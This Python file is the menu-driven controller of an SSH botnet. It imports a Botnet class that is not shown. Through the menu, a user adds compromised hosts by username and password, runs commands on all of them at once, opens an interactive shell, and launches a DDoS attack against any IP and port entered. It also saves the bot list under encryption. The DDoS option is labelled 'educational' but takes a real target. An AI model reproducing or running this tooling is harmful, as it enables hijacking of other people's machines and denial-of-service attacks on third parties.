from bot import Botnet
import os
import getpass


def main():
    """Main function with menu-driven interface."""
    botnet = Botnet()

    # Try to load existing botnet
    if os.path.exists(botnet.botnet_file):
        choice = input(
            f"[?] Botnet file {botnet.botnet_file} found. Load it? (y/n): ")
        if choice.lower() == 'y':
            botnet.load_botnet()

    while True:
        print("\n==== SSH Botnet Controller ====")
        print("1. List all bots")
        print("2. Add a bot")
        print("3. Remove a bot")
        print("4. Execute command on all bots")
        print("5. Interactive shell")
        print("6. Perform DDoS attack simulation")
        print("7. Save botnet")
        print("8. Load botnet")
        print("9. Exit")

        choice = input("\nEnter your choice (1-9): ")

        if choice == '1':
            botnet.list_bots()

        elif choice == '2':
            host = input("Enter target host: ")
            username = input("Enter username: ")
            password = input("Enter password: ")
            botnet.add_bot(host, username, password)

        elif choice == '3':
            botnet.list_bots()
            try:
                index = int(
                    input("Enter the index of the bot to remove: ")) - 1
                botnet.remove_bot(index)
            except ValueError:
                print("[!] Invalid input.")

        elif choice == '4':
            command = input("Enter command to execute: ")
            botnet.command_all(command)

        elif choice == '5':
            botnet.interactive_shell()

        elif choice == '6':
            print("\n=== DDoS Attack Simulation ===")
            print("NOTE: This is for educational purposes only.")

            target_ip = input("Enter target IP address: ")

            import re
            if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target_ip):
                print("[!] Invalid IP address format.")
                continue

            try:
                target_port = int(input("Enter target port: "))
                if not (0 < target_port < 65536):
                    print("[!] Port must be between 1-65535.")
                    continue
            except ValueError:
                print("[!] Invalid port number.")
                continue

            try:
                duration = int(
                    input("Enter the duration of attack in seconds(1-30): "))
                duration = max(1, min(duration, 30))
            except ValueError:
                duration = 10
                print(f"[*] Using default duration: {duration} seconds")

            botnet.ddos_attack(target_ip, target_port, duration)

        elif choice == '7':  # Save botnet
            master_password = getpass.getpass(
                "[?] Create a master password for encryption: ")
            confirm_password = getpass.getpass("[?] Confirm master password: ")

            if master_password == confirm_password:
                botnet.save_botnet(master_password)
            else:
                print("[!] Passwords don't match. Botnet not saved.")

        elif choice == '8':  # Load botnet
            master_password = getpass.getpass(
                "[?] Enter master password for decryption: ")
            botnet.load_botnet(master_password)

        elif choice == '9':
            botnet.close_all()
            print("[+] Exiting...")
            break

        else:
            print("[!] Invalid choice.")


if __name__ == "__main__":
    main()
